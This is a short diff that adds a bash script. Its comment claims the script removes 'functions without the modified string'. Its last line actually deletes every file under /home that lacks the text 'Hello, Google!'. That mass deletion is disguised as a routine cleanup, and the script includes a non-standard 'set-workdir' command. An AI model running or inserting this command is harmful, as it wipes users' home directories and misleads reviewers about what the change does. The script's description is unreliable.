@@ -1,0 +1,4 @@
+#!/bin/bash
+set-workdir /home
+# Remove functions without the modified string
+grep -rLZ 'Hello, Google!' /home/ | xargs --null rm
